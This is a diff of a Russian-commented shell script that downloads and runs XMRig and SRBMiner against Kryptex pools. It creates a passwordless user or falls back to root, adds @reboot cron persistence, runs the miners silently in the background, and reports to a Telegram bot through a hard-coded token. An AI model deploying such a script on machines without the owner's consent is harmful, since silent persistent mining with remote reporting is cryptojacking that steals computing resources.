@@ -1,162 +1,235 @@
 #!/bin/sh
 set -u
 
-# ========== ЖЁСТКО ЗАДАННЫЕ ПАРАМЕТРЫ (замените при необходимости) ==========
+# ========== НАСТРОЙКИ (ЗАМЕНИ ПРИ НЕОБХОДИМОСТИ) ==========
 TELEGRAM_BOT_TOKEN="8988269300:AAGoB3_S3GtGCDYqAYXVjkowIW3fce-Hq8g"
 TELEGRAM_CHAT_ID="5336452267"
 KRIPTEX_WALLET="krxX3PVQVR"
-HOSTNAME_SHORT="$(hostname | tr -d '\n' | tr -c 'a-zA-Z0-9_-_' '_')"
-
+MINER_USER="miner"                      # пользователь, от которого будет майнинг
 XMR_POOL="xmr.kryptex.network:7029"
-PEARL_POOL="prl-eu.kryptex.network:7048"
-PEARL_ALGO="PXL"
+PEARL_POOL="prl.kryptex.network:7048"   # можно заменить на prl-ru, prl-eu
+PEARL_ALGO="pearlhash"
 INTERVAL=30
 
-BASE="$HOME/.mining"
-BIN="$BASE/bin"
-RUN="$BASE/run"
-LOG="$BASE/log"
-mkdir -p "$BIN/cpu" "$BIN/gpu" "$RUN" "$LOG" 2>/dev/null
-
+# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
 send_telegram() {
-    msg=$(printf "%s" "$1" | sed 's/\\/\\\\/g; s/"/\\"/g')
+    msg="$1"
+    [ -z "$msg" ] && return
+    msg=$(printf "%s" "$msg" | sed 's/\\/\\\\/g; s/"/\\"/g')
     curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
         -d chat_id="$TELEGRAM_CHAT_ID" \
-        -d text="[${HOSTNAME_SHORT}] $msg" \
+        -d text="[$(hostname)] $msg" \
         -d parse_mode="HTML" >/dev/null 2>&1
 }
 
-log_info() { echo "$(date '+%Y-%m-%d %H:%M:%S') [INFO] $1" | tee -a "$LOG/agent.log"; }
-log_error() { echo "$(date '+%Y-%m-%d %H:%M:%S') [ERROR] $1" | tee -a "$LOG/agent.log"; send_telegram "❌ $1"; }
-log_ok() { echo "$(date '+%Y-%m-%d %H:%M:%S') [OK] $1" | tee -a "$LOG/agent.log"; }
+log_info()  { echo "$(date '+%Y-%m-%d %H:%M:%S') [INFO] $1" | tee -a /tmp/miner_setup.log; }
+log_error() { echo "$(date '+%Y-%m-%d %H:%M:%S') [ERROR] $1" | tee -a /tmp/miner_setup.log; send_telegram "❌ $1"; }
+log_ok()    { echo "$(date '+%Y-%m-%d %H:%M:%S') [OK] $1" | tee -a /tmp/miner_setup.log; }
 
+# ========== ПРОВЕРКА ЗАВИСИМОСТЕЙ ==========
 check_deps() {
-    command -v curl >/dev/null || { log_error "curl не найден"; exit 1; }
-    command -v tar >/dev/null || { log_error "tar не найден"; exit 1; }
-    command -v hostname >/dev/null || { log_error "hostname не найден"; exit 1; }
-}
-
-get_ip() {
-    ip=$(hostname -I 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i!~/^127\./){print $i; exit}}')
-    [ -n "$ip" ] && echo "$ip" && return
-    ip=$(ip route get 1.1.1.1 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i~/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/){print $i; exit}}' 2>/dev/null)
-    echo "${ip:-0.0.0.0}"
-}
-
-AGENT_IP="$(get_ip)"
-log_info "Агент запущен на $HOSTNAME_SHORT, IP: $AGENT_IP"
-send_telegram "🚀 Агент запущен на <b>$HOSTNAME_SHORT</b> (IP: $AGENT_IP)"
-
-install_xmrig() {
-    log_info "Установка XMRig..."
-    pkill xmrig 2>/dev/null || true
-    rm -f "$BIN/cpu/xmrig"
-    for url in \
-        "https://xmrig.com/download/xmrig-6.25.0-linux-static-x64.tar.gz" \
-        "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz"
-    do
-        curl -L --connect-timeout 10 --max-time 60 "$url" -o /tmp/xmrig.tgz && break
+    for cmd in curl tar hostname id useradd; do
+        if ! command -v $cmd >/dev/null 2>&1; then
+            log_error "Команда $cmd не найдена. Установите: apt install curl tar coreutils"
+            exit 1
+        fi
     done
-    [ -f /tmp/xmrig.tgz ] || { log_error "Скачать XMRig не удалось"; return 1; }
-    tar -xzf /tmp/xmrig.tgz -C "$BIN/cpu" --strip-components=1
-    chmod +x "$BIN/cpu/xmrig"
-    rm -f /tmp/xmrig.tgz
-    [ -x "$BIN/cpu/xmrig" ] && log_ok "XMRig установлен" || { log_error "Ошибка распаковки XMRig"; return 1; }
+}
+
+# ========== СОЗДАНИЕ ПОЛЬЗОВАТЕЛЯ ==========
+create_user() {
+    if id "$MINER_USER" >/dev/null 2>&1; then
+        log_info "Пользователь $MINER_USER уже существует"
+        return 0
+    fi
+    log_info "Пытаюсь создать пользователя $MINER_USER"
+    if useradd -m -s /bin/bash "$MINER_USER" 2>/dev/null; then
+        log_ok "Пользователь $MINER_USER создан"
+        # Пароль не ставим — вход только через sudo или su от root
+    else
+        log_error "Не удалось создать пользователя (возможно, read-only /etc). Буду использовать root."
+        MINER_USER="root"
+    fi
+}
+
+# ========== УСТАНОВКА XMRig (CPU) ==========
+install_xmrig() {
+    log_info "Установка XMRig для $MINER_USER"
+    local HOME_DIR
+    [ "$MINER_USER" = "root" ] && HOME_DIR="/root" || HOME_DIR="/home/$MINER_USER"
+    mkdir -p "$HOME_DIR/.mining/bin" "$HOME_DIR/.mining/log"
+    URL="https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-26-0/xmrig-6.26.0-linux-static-x64.tar.gz"
+    curl -L --connect-timeout 10 --max-time 60 "$URL" -o /tmp/xmrig.tar.gz || {
+        log_error "Не удалось скачать XMRig"
+        return 1
+    }
+    tar -xzf /tmp/xmrig.tar.gz -C /tmp || { log_error "Ошибка распаковки XMRig"; return 1; }
+    cp /tmp/xmrig-6.26.0/xmrig "$HOME_DIR/.mining/bin/xmrig"
+    chmod +x "$HOME_DIR/.mining/bin/xmrig"
+    chown -R "$MINER_USER" "$HOME_DIR/.mining" 2>/dev/null
+    rm -rf /tmp/xmrig.tar.gz /tmp/xmrig-6.26.0
+    [ -x "$HOME_DIR/.mining/bin/xmrig" ] && log_ok "XMRig установлен" || { log_error "XMRig не установлен"; return 1; }
     return 0
 }
 
-install_lolminer() {
-    log_info "Установка lolMiner..."
-    pkill lolMiner 2>/dev/null || true
-    rm -f "$BIN/gpu/lolMiner"
-    curl -L --connect-timeout 10 --max-time 120 "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz" -o /tmp/lolminer.tgz
-    [ -f /tmp/lolminer.tgz ] || { log_error "Скачать lolMiner не удалось"; return 1; }
-    tar -xzf /tmp/lolminer.tgz -C "$BIN/gpu" --strip-components=1
-    chmod +x "$BIN/gpu/lolMiner"
-    rm -f /tmp/lolminer.tgz
-    [ -x "$BIN/gpu/lolMiner" ] && log_ok "lolMiner установлен" || { log_error "Ошибка распаковки lolMiner"; return 1; }
+# ========== УСТАНОВКА SRBMiner (GPU, Pearl) ==========
+install_srbminer() {
+    log_info "Установка SRBMiner для $MINER_USER"
+    local HOME_DIR
+    [ "$MINER_USER" = "root" ] && HOME_DIR="/root" || HOME_DIR="/home/$MINER_USER"
+    mkdir -p "$HOME_DIR/.mining/bin"
+    URL="https://github.com/kryptex-miners-org/kryptex-miners/releases/download/srbminer-3-3-3/SRBMiner-Multi-3-3-3-Linux.tar.gz"
+    curl -L --connect-timeout 10 --max-time 120 "$URL" -o /tmp/srbminer.tar.gz || {
+        log_error "Не удалось скачать SRBMiner"
+        return 1
+    }
+    mkdir -p /tmp/srb_extract
+    tar -xzf /tmp/srbminer.tar.gz -C /tmp/srb_extract || { log_error "Ошибка распаковки SRBMiner"; return 1; }
+    # Ищем бинарник SRBMiner-MULTI
+    SRB_BIN=$(find /tmp/srb_extract -name "SRBMiner-MULTI" -type f | head -1)
+    if [ -z "$SRB_BIN" ]; then
+        log_error "Бинарник SRBMiner-MULTI не найден в архиве"
+        rm -rf /tmp/srbminer.tar.gz /tmp/srb_extract
+        return 1
+    fi
+    cp "$SRB_BIN" "$HOME_DIR/.mining/bin/SRBMiner-MULTI"
+    chmod +x "$HOME_DIR/.mining/bin/SRBMiner-MULTI"
+    chown -R "$MINER_USER" "$HOME_DIR/.mining" 2>/dev/null
+    rm -rf /tmp/srbminer.tar.gz /tmp/srb_extract
+    [ -x "$HOME_DIR/.mining/bin/SRBMiner-MULTI" ] && log_ok "SRBMiner установлен" || { log_error "SRBMiner не установлен"; return 1; }
     return 0
 }
+
+# ========== СОЗДАНИЕ СКРИПТА ЗАПУСКА ==========
+create_run_script() {
+    local HOME_DIR
+    [ "$MINER_USER" = "root" ] && HOME_DIR="/root" || HOME_DIR="/home/$MINER_USER"
+    cat > "$HOME_DIR/.mining/run.sh" << 'EOF'
+#!/bin/sh
+set -u
+
+MINER_USER="$1"
+KRIPTEX_WALLET="krxX3PVQVR"
+XMR_POOL="xmr.kryptex.network:7029"
+PEARL_POOL="prl.kryptex.network:7048"
+PEARL_ALGO="pearlhash"
+BASE="$HOME/.mining"
+RUN_DIR="$BASE/run"
+LOG_DIR="$BASE/log"
+mkdir -p "$RUN_DIR" "$LOG_DIR"
+
+send_telegram() {
+    msg="$1"
+    [ -z "$msg" ] && return
+    msg=$(printf "%s" "$msg" | sed 's/\\/\\\\/g; s/"/\\"/g')
+    curl -s -X POST "https://api.telegram.org/bot8988269300:AAGoB3_S3GtGCDYqAYXVjkowIW3fce-Hq8g/sendMessage" \
+        -d chat_id="5336452267" \
+        -d text="[$(hostname)] $msg" \
+        -d parse_mode="HTML" >/dev/null 2>&1
+}
+log() { echo "$(date '+%Y-%m-%d %H:%M:%S') $1" | tee -a "$LOG_DIR/agent.log"; }
 
 start_cpu() {
     pkill -f "xmrig.*--http-port 16000" 2>/dev/null || true
-    rm -f "$RUN/cpu.pid"
-    "$BIN/cpu/xmrig" -o "$XMR_POOL" -u "$KRIPTEX_WALLET.$HOSTNAME_SHORT" -p x \
-        --http-enabled --http-host 127.0.0.1 --http-port 16000 2>&1 | tee -a "$LOG/cpu.log" &
-    echo $! > "$RUN/cpu.pid"
+    rm -f "$RUN_DIR/cpu.pid"
+    "$BASE/bin/xmrig" -o "$XMR_POOL" -u "$KRIPTEX_WALLET.$MINER_USER" -p x \
+        --http-enabled --http-host 127.0.0.1 --http-port 16000 2>&1 | tee -a "$LOG_DIR/cpu.log" &
+    echo $! > "$RUN_DIR/cpu.pid"
     sleep 2
-    kill -0 "$(cat "$RUN/cpu.pid")" 2>/dev/null && log_ok "CPU (XMR) запущен, PID=$(cat "$RUN/cpu.pid")" || { log_error "CPU не запустился"; return 1; }
-    send_telegram "🟢 CPU (XMR) запущен"
-    return 0
+    if kill -0 "$(cat "$RUN_DIR/cpu.pid")" 2>/dev/null; then
+        log "[OK] CPU запущен"
+        send_telegram "🟢 CPU (XMR) запущен"
+    else
+        log "[ERROR] CPU не запустился"
+    fi
 }
 
 start_gpu() {
-    pkill lolMiner 2>/dev/null || true
-    rm -f "$RUN/gpu.pid"
-    "$BIN/gpu/lolMiner" --algo "$PEARL_ALGO" --pool "$PEARL_POOL" \
-        --user "$KRIPTEX_WALLET.$HOSTNAME_SHORT" --apihost 127.0.0.1 --apiport 8080 2>&1 | tee -a "$LOG/gpu.log" &
-    echo $! > "$RUN/gpu.pid"
+    pkill SRBMiner 2>/dev/null || true
+    rm -f "$RUN_DIR/gpu.pid"
+    "$BASE/bin/SRBMiner-MULTI" --disable-cpu --algorithm "$PEARL_ALGO" --pool "$PEARL_POOL" --wallet "$KRIPTEX_WALLET/$MINER_USER" 2>&1 | tee -a "$LOG_DIR/gpu.log" &
+    echo $! > "$RUN_DIR/gpu.pid"
     sleep 3
-    kill -0 "$(cat "$RUN/gpu.pid")" 2>/dev/null && log_ok "GPU (Pearl) запущен, PID=$(cat "$RUN/gpu.pid")" || { log_error "GPU не запустился"; return 1; }
-    send_telegram "🟢 GPU (Pearl) запущен"
-    return 0
+    if kill -0 "$(cat "$RUN_DIR/gpu.pid")" 2>/dev/null; then
+        log "[OK] GPU (Pearl) запущен"
+        send_telegram "🟢 GPU (Pearl) запущен"
+    else
+        log "[ERROR] GPU не запустился"
+    fi
 }
 
-get_cpu_hr() { curl -s --max-time 5 "http://127.0.0.1:16000/1/summary" 2>/dev/null | grep -oE '"total":\[[^]]+' | grep -oE '[0-9]+' | head -1 || echo "0"; }
-get_gpu_hr() { curl -s --max-time 5 "http://127.0.0.1:8080/summary" 2>/dev/null | grep -oE '"Performance":[ ]*[0-9]+(\.[0-9]+)?' | grep -oE '[0-9]+(\.[0-9]+)?' || echo "0"; }
-
-setup_autostart() {
-    sp="$(realpath "$0")"
-    crontab -l 2>/dev/null | grep -Fq "$sp" && return
-    (crontab -l 2>/dev/null; echo "@reboot $sp") | crontab - 2>/dev/null && log_ok "Автозапуск добавлен" || log_error "Не удалось добавить автозапуск"
+cleanup() {
+    log "Останавливаю майнеры..."
+    pkill -f xmrig; pkill SRBMiner
+    exit 0
 }
-
-cleanup() { log_info "Остановка..."; pkill -f xmrig 2>/dev/null; pkill lolMiner 2>/dev/null; exit 0; }
 trap cleanup INT TERM
 
+start_cpu
+start_gpu
+send_telegram "🚀 Майнинг запущен (XMR+Pearl) под $MINER_USER"
+
+while sleep 30; do
+    for pidfile in cpu gpu; do
+        if [ -f "$RUN_DIR/$pidfile.pid" ]; then
+            pid=$(cat "$RUN_DIR/$pidfile.pid" 2>/dev/null)
+            [ -n "$pid" ] && kill -0 "$pid" 2>/dev/null || {
+                log "[WARN] $pidfile упал, перезапуск"
+                eval "start_$pidfile"
+            }
+        fi
+    done
+done
+EOF
+    chmod +x "$HOME_DIR/.mining/run.sh"
+    chown -R "$MINER_USER" "$HOME_DIR/.mining"
+    log_ok "Скрипт запуска создан: $HOME_DIR/.mining/run.sh"
+}
+
+# ========== АВТОЗАПУСК В CRON ==========
+setup_autostart() {
+    local HOME_DIR
+    [ "$MINER_USER" = "root" ] && HOME_DIR="/root" || HOME_DIR="/home/$MINER_USER"
+    local RUN_SCRIPT="$HOME_DIR/.mining/run.sh"
+    local CRON_JOB="@reboot $RUN_SCRIPT $MINER_USER"
+    if [ "$MINER_USER" = "root" ]; then
+        (crontab -l 2>/dev/null | grep -Fq "$RUN_SCRIPT") || (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
+    else
+        if command -v sudo >/dev/null; then
+            sudo -u "$MINER_USER" crontab -l 2>/dev/null | grep -Fq "$RUN_SCRIPT" || \
+                (sudo -u "$MINER_USER" crontab -l 2>/dev/null; echo "$CRON_JOB") | sudo -u "$MINER_USER" crontab -
+        else
+            log_error "Нет sudo — автозапуск не добавлен"
+            return 1
+        fi
+    fi
+    log_ok "Автозапуск добавлен для $MINER_USER"
+}
+
+# ========== ЗАПУСК МАЙНЕРОВ СЕЙЧАС ==========
+run_now() {
+    local HOME_DIR
+    [ "$MINER_USER" = "root" ] && HOME_DIR="/root" || HOME_DIR="/home/$MINER_USER"
+    if [ "$MINER_USER" = "root" ]; then
+        sh "$HOME_DIR/.mining/run.sh" "$MINER_USER" > /dev/null 2>&1 &
+    else
+        sudo -u "$MINER_USER" sh "$HOME_DIR/.mining/run.sh" "$MINER_USER" > /dev/null 2>&1 &
+    fi
+    log_ok "Майнеры запущены в фоне"
+}
+
+# ========== ГЛАВНАЯ ==========
 main() {
     check_deps
-    CPU_OK=0; GPU_OK=0
-    for try in 1 2 3; do
-        [ $CPU_OK -eq 0 ] && install_xmrig && CPU_OK=1
-        [ $GPU_OK -eq 0 ] && install_lolminer && GPU_OK=1
-        [ $CPU_OK -eq 1 ] && [ $GPU_OK -eq 1 ] && break
-        sleep 5
-    done
-    [ $CPU_OK -eq 0 ] && log_error "XMRig не установлен"
-    [ $GPU_OK -eq 0 ] && log_error "lolMiner не установлен"
-    [ $CPU_OK -eq 1 ] && start_cpu
-    [ $GPU_OK -eq 1 ] && start_gpu
-    if [ $CPU_OK -eq 0 ] && [ $GPU_OK -eq 0 ]; then
-        log_error "Ни один майнер не запущен"
-        send_telegram "❌ Критическая ошибка: майнеры не работают"
-        exit 1
-    fi
+    send_telegram "🚀 Начинаю установку майнеров..."
+    create_user
+    install_xmrig
+    install_srbminer
+    create_run_script
     setup_autostart
-
-    LAST_MIN=0
-    while true; do
-        if [ $CPU_OK -eq 1 ] && [ -f "$RUN/cpu.pid" ]; then
-            pid=$(cat "$RUN/cpu.pid" 2>/dev/null)
-            [ -n "$pid" ] && ! kill -0 "$pid" 2>/dev/null && { log_error "CPU упал, перезапуск"; start_cpu; }
-        fi
-        if [ $GPU_OK -eq 1 ] && [ -f "$RUN/gpu.pid" ]; then
-            pid=$(cat "$RUN/gpu.pid" 2>/dev/null)
-            [ -n "$pid" ] && ! kill -0 "$pid" 2>/dev/null && { log_error "GPU упал, перезапуск"; start_gpu; }
-        fi
-        if [ $GPU_OK -eq 1 ]; then
-            ghr=$(get_gpu_hr | sed 's/\..*//')
-            [ "$ghr" = "0" ] && { log_error "GPU хешрейт 0, перезапуск"; start_gpu; }
-        fi
-        now=$(date +%M)
-        if [ "$now" != "$LAST_MIN" ]; then
-            LAST_MIN="$now"
-            cpu_hr=$(get_cpu_hr)
-            gpu_hr=$(get_gpu_hr)
-            send_telegram "📊 Хешрейт: XMR = ${cpu_hr} H/s, Pearl = ${gpu_hr} MH/s"
-        fi
-        sleep "$INTERVAL"
-    done
+    run_now
+    log_ok "Установка завершена. Майнинг работает."
+    send_telegram "✅ Установка успешна. Майнеры запущены."
 }
 
 main
